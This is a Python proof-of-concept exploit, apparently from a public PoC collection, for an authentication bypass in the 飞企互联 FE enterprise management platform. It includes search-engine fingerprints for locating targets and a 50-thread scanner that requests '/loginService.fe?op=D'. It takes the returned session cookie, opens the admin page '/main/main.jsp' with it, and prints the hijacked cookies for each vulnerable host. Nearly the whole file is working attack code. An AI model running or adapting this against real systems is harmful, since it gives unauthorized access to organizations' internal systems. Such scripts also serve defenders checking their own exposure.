#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:MDSEC
# from:https://github.com/MD-SEC/MDPOCS
# FOFA：app="飞企互联-FE企业运营管理平台"
# Zoomeye: iconhash: "e90223165de1b1c7ae95336f10c3fe5d"

import sys
import requests
import csv
import urllib3
import hashlib
from concurrent.futures import ThreadPoolExecutor

if len(sys.argv) != 2:
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ DES: by MDSEC as https://github.com/MD-SEC/MDPOCS                                                   +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    print(
        '+ USE: python3 <filename> <hosts.txt>                                                                           +')
    print(
        '+ EXP: python3 Feiqihulian_FE_Login_Bypass_Exp.py url.txt                                                         +')
    print(
        '+----------------------------------------------------------------------------------------------------------+')
    sys.exit()
proxysdata = {
'http': '127.0.0.1:8080',
'https': '127.0.0.1:8080'
} 
def poc(host):
    if "http" in host:
        url = host
    else:
        url ="http://"+host
    host1=url.replace("http://","")
    host2=host1.replace("https://","")
    headers1 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Host": "%s" % host2  
    }
    #payload1='/2.ln?SYS_LINK=77507068764957484a5067777862714f457a66574871642f4330574c76717868394a35496d37416c497951724f33446f51486375685a5a2b31684938472b7056'
    payload2='/loginService.fe?op=D'
    try:
        #r1 = requests.get(url+payload1, headers=headers1)
        r2 = requests.get(url+payload2, headers=headers1)
        if "流程" in r2.text:
            cookies=r2.headers['Set-Cookie']
            headers2 = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
        "Host": "%s" % host2,
        "Cookie":"%s"%cookies  
        }
        
            r3=requests.get(url+"/main/main.jsp",headers=headers2)
            if "系统配置" in r3.text:
                print(url+payload2+"\ncookies:"+r2.headers['Set-Cookie'])
        else:
            return 0
            print (host+":false")
    except:
        pass
        #print (host+":false")

if __name__ == '__main__':
    file = sys.argv[1]
    data = open(file)
    reader = csv.reader(data)
    with ThreadPoolExecutor(50) as pool:
        for row in reader:
            pool.submit(poc, row[0])